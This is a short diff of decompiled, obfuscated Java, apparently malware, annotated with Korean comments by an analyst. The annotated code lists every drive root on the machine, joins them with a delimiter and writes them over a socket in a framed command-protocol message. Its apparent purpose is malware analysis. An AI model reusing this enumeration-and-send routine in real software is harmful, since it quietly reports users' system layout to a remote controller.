@@ -23,13 +23,15 @@ public class e {
 
       try {
          File[] var4;
-         int var3 = (var4 = File.listRoots()).length;
+         int var3 = (var4 = File.listRoots()).length;   // File.listRoots(): 하드디스크의 루트 경로 리스트를 File[]로 반환한다.
 
-         for(int var2 = 0; var2 < var3; ++var2) {
+         for(int var2 = 0; var2 < var3; ++var2) {   // 모든 루트 경로 리스트에 대해
             File var0 = var4[var2];
-            var1 = var1 + var0 + k.e;
+            var1 = var1 + var0 + k.e;   // k.e = "^!@", 모든 루트 경로를 붙이면서 사이사이에 ^!@를 끼운다.
          }
 
+         // k.k: Socket
+         // Parameter of writeBytes: k.g + "$#@" + "@0002" + "$#@" + var1 + "$#@" + "&&&"
          (new DataOutputStream(k.k.getOutputStream())).writeBytes(k.g + k.d + k.y + k.d + var1 + k.d + "&&&");
       } catch (Exception var5) {
          var5.printStackTrace();
